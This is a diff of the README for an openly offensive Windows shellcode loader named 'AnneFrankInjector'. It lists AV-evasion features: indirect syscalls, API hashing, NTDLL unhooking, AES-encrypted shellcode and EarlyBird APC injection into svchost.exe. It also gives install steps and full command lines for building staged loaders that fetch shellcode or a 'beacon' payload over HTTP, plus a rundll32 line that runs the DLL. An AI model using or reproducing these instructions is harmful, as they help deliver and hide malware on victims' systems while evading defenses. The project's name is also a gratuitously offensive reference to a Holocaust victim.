@@ -61,183 +61,146 @@ Check out my blog post for more infos: [Evade Modern AVs in 2026](#)
 
 ## Evasion Features
 
-- Indirect Syscalls via Syswhispers (rewrote in NASM compatible assembly)
-- API Hashing
-- NTDLL unhooking via Known DLLs technique
-- Custom GetProcAddr & GetModuleHandle functions
-- Custom AES-128-CBC mode encryption & decryption
-- EarlyBird APC Injection
-- Possibility to choose between staged or stageless loader
-- "Polymorphic" behavior with the -s argument (scramble like changing hiding spots)
+- **Stageless**: Shellcode embedded directly into the loader.
+- **Staged**: Shellcode fetched via HTTP (encrypted on the fly).
+- **Evasion**:  
+  - Indirect syscalls (Syswhispers)  
+  - API hashing (Djb2)  
+  - NTDLL unhooking (KnownDLLs)  
+  - AES-128-CBC encryption  
+  - EarlyBird APC injection into `RuntimeBroker.exe` or `svchost.exe`  
+  - Function/variable name scrambling (`-s`)
+- **Output**: EXE or DLL (exported function `af`).
+- **Code signing**: Optional with a PFX certificate.
 
 ## Installation
 
-Depending on your OS, the installation will slightly differ. In general, make sure you have the following stuff installed:
+### Prerequisites
 
-- CLANG compiler
-- MinGW-w64 Toolchain
-- Make
+- **Python 3.8+** and `pip`
+- **MinGW‑w64** cross‑compiler (to build Windows executables)
+- **NASM** (for assembly code)
+- **osslsigncode** (optional, for signing)
 
-If I am not mistaken, those are by default installed on KALI Linux. However, if you want to install them manually, this should do the trick:
+**On Kali / Debian‑based Linux:**
 
 ```bash
-# Assuming Debian based system
 sudo apt update
-sudo apt install clang pipx mingw-w64 make lld nasm osslsigncode
-
-# Verify installation
-clang --version
-make --version
-
-# or
-clang -v
-
-# If this is the case, refer to the chapter "Makefile" to replace the compiler in the Makefile of the templates
+sudo apt install clang mingw-w64 nasm lld osslsigncode
 ```
 
-It's a bit of a different story on Windows. You need to install the MinGW-w64 toolchain by installing MSYS2 first.
+**On Windows:**  
+Install [MSYS2](https://www.msys2.org/), then in its terminal:
 
-```powershell
-# Go there and install this
-https://www.msys2.org/
-
-# Then
-pacman -Syu
-pacman -S mingw-w64-x86_64-clang
-
-# Veryify installation
-x86_64-w64-mingw32-clang --version
-
-# Install make
-pacman -S make
-
-# Verify installation
-make --version
-```
-
-You should also check under `C:\msys64\mingw64\bin`. This is a common place where the toolchain is being installed.
-
-After the basis installation, don't forget to install the python requirements ! Otherwise the packer will not work :D !
-
-**Linux**:
 ```bash
-# Via pipx (preferred way)
-cd AnneFrankInjector
-python3 -m pipx install .
-# You can use afpacker globaly now
-
-# Via manual virtual environment
-cd AnneFrankInjector
-python3 -m venv env
-source env/bin/activate
-python3 -m pip install .
-
-# Once you're done using the tool
-deactivate
-
-# Old fashion
-cd AnneFrankInjector
-python3 -m pip install -r requirements.txt --break-system-packages
-python3 main.py -h
-```
-**Windows**:
-```powershell
-# Via pip
-cd AnneFrankInjector
-python3 -m pip install .
-
-# Done ! :)
+pacman -Syu
+pacman -S mingw-w64-x86_64-clang make nasm
 ```
 
-### Makefile
+### Install AnneFrankInjector
 
-You should NOT modify the Makefile unless you know what you are doing! But check the compiler line like before.
+1. **Clone the repository** (or download the ZIP) and enter the folder:
+
+   ```bash
+   git clone https://github.com/Excalibra/AnneFrankInjector.git
+   cd AnneFrankInjector
+   ```
+
+2. **Install Python dependencies** (choose one method):
+
+   - **Virtual environment (recommended)**  
+     ```bash
+     python3 -m venv env
+     source env/bin/activate      # Linux
+     env\Scripts\activate          # Windows
+     pip install -r requirements.txt
+     ```
+
+   - **Global installation (pipx)** – makes `afpacker` available system‑wide  
+     ```bash
+     pipx install .
+     ```
+
+   - **Old‑fashioned**  
+     ```bash
+     pip install -r requirements.txt --break-system-packages
+     ```
+
+> **Note:** The GUI (`af.py`) uses `tkinter` (built‑in with Python). No extra install needed.
 
 ## Usage
-## Usage
 
-General usage:
-```
-usage: main.py [-h] {staged,stageless} ...
+### 1. Graphical Interface (Recommended)
 
-afpacker
+Run the GUI from the project root:
 
-positional arguments:
-  {staged,stageless}  Staged or Stageless Payloads
-    staged            Staged
-    stageless         Stageless
-
-options:
-  -h, --help          show this help message and exit
+```bash
+python af.py
 ```
 
-Staged:
+The window lets you:
+- Select your raw shellcode file (`.bin`).
+- Choose between **Stageless** (embed) or **Staged** (HTTP download).
+- Set options like encryption, scrambling, output format (EXE/DLL), APC target, and code signing.
+- Click **Generate Loader** – the output appears in the text area and the loader is saved in the current folder.
 
-```
-usage: main.py staged [-h] -p PAYLOAD [-f {EXE,DLL}] -i IP_ADDRESS -po PORT -pa PATH [-o OUTPUT] [-e] [-s] [-pfx PFX] [-pfx-pass PFX_PASSWORD]
+<img width="721" height="681" alt="image" src="https://github.com/user-attachments/assets/8599b9f4-34ff-45a7-ae66-e59c5fad182f" />
 
-options:
-  -h, --help            show this help message and exit
-  -p PAYLOAD, --payload PAYLOAD
-                        Shellcode to be packed
-  -f {EXE,DLL}, --format {EXE,DLL}
-                        Format of the output file (default: EXE).
-  -i IP_ADDRESS, --ip-address IP_ADDRESS
-                        IP address from where your shellcode is gonna be fetched.
-  -po PORT, --port PORT
-                        Port from where the HTTP connection is gonna fetch your shellcode.
-  -pa PATH, --path PATH
-                        Path from where your shellcode uis gonna be fetched.
-  -o OUTPUT, --output OUTPUT
-                        Output path where the shellcode is gonna be saved.
-  -e, --encrypt         Encrypt the shellcode via AES-128-CBC.
-  -s, --scramble        Scramble the loader's functions and variables.
-  -pfx PFX, --pfx PFX   Path to the PFX file for signing the loader.
-  -pfx-pass PFX_PASSWORD, --pfx-password PFX_PASSWORD
-                        Password for the PFX file.
 
-Example usage: python main.py staged -p shellcode.bin -i 192.168.1.150 -po 8080 -pa '/shellcode.bin' -o shellcode -e -s -pfx cert.pfx -pfx-pass 'password'
+### 2. Command‑line Interface
+
+After installation (or from the `Linux` folder), you can use the `afpacker` command (or `python main.py`). The syntax is similar to the original CTFPacker.
+
+#### Stageless (embed shellcode)
+
+```bash
+afpacker stageless -p payload.bin -e -s -o myloader
 ```
 
-Stageless:
+- `-p` : raw shellcode file
+- `-e` : encrypt the shellcode
+- `-s` : scramble function/variable names
+- `-o` : output filename (without extension; default `afloader`)
+- `-f DLL` : build a DLL instead of EXE
 
-```
-usage: main.py stageless [-h] -p PAYLOAD [-f {EXE,DLL}] [-e] [-s] [-pfx PFX] [-pfx-pass PFX_PASSWORD]
+#### Staged (fetch shellcode via HTTP)
 
-options:
-  -h, --help            show this help message and exit
-  -p PAYLOAD, --payload PAYLOAD
-                        Shellcode to be packed
-  -f {EXE,DLL}, --format {EXE,DLL}
-                        Format of the output file (default: EXE).
-  -e, --encrypt         Encrypt the shellcode via AES-128-CBC.
-  -s, --scramble        Scramble the loader's functions and variables.
-  -pfx PFX, --pfx PFX   Path to the PFX file for signing the loader.
-  -pfx-pass PFX_PASSWORD, --pfx-password PFX_PASSWORD
-                        Password for the PFX file.
-
-Example usage: python main.py stageless -p shellcode.bin -o shellcode -e -s -pfx cert.pfx -pfx-pass 'password'
+```bash
+afpacker staged -p payload.bin -i 192.168.1.10 -po 8080 -pa /shellcode.bin -e -s -o myloader
 ```
 
-### Format option
+- `-i` : IP address of the HTTP server
+- `-po` : port
+- `-pa` : path on the server (e.g., `/shellcode.bin`)
 
-In both cases, staged or stageless, you can choose whether to compile your loader as an EXE or a DLL. To compile it as a DLL, simply append `-f DLL`. By default, it compiles as an EXE, though you can also explicitly specify this using -f EXE (but you don't need to).
+#### Code signing
 
-The DLL version exports a function called `af`. This is the function you need to call to start the exection. 
+Add `-pfx cert.pfx -pfx-pass password` to any command to sign the output file.
 
-```powershell
+#### Output format
+
+Add `-f DLL` to produce a DLL. The exported function is named `af`. Execute it with:
+
+```cmd
 rundll32.exe afloader.dll,af
 ```
 
-### Staged
+## Examples
 
-When using the staged "mode", the packer will generate you a .bin file named accordingly to your `-o` arg. With the `-pa` argument, you are actually telling the loader *where* on the websever (basically the path) it should search for that .bin file. So TLDR those two values should usually be the same.
+**Stageless, encrypted, scrambled EXE** (no signing):
 
-Example:
-
-```powershell
-python main.py staged -p "C:\Code\afpacker\calc.bin" -i 192.168.2.121 -po 8080 -pa /shellcode.bin -o shellcode -s -pfx cert.pfx -pfx-pass Password
+```bash
+afpacker stageless -p calc.bin -e -s
+# Creates afloader.exe
 ```
+
+**Staged DLL, custom output name**:
+
+```bash
+afpacker staged -p beacon.bin -i 10.0.0.5 -po 80 -pa /payload.bin -f DLL -o beacon
+# Creates beacon.dll
+```
+
 
 
 ## To-Do
